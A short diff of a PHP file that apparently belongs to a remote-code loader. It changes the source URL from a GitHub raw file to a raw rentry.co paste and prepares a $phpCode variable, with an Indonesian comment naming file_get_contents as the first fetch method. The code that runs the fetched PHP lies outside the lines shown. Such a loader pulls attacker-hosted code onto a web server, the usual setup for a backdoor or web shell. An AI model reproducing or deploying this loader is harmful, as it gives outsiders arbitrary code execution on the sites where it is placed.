@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/DamnSec/x/main/1.txt";
+$url = "https://rentry.co/aboutphp/raw";
 $phpCode = null;
 
 // Fungsi 1: file_get_contents
